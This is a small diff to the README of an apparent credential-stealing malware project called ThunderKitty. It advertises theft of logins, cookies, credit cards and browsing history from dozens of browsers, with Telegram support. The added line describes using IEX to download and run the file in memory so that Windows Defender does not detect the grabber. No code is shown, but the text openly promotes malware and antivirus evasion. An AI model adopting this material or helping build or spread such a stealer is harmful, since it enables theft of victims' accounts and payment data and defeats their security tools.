@@ -18,7 +18,7 @@ GUI : ![image](https://github.com/EvilBytecode/ThunderKitty/assets/151552809/fef
    - Steals logins, cookies, credit cards, history, and download lists from 37 Chromium-based browsers.
    - Steals logins, cookies, history, and download lists from 10 Gecko browsers.
 - Telegram Support ✔️
-
+- Defender stuff will flag, thats why we will use IEX in the file to download and run it, dw the grabber shouldnt be detected
 # Cons
 - Best grabber 🤣
 - Discord :x: (Discord will terminate your account now.)
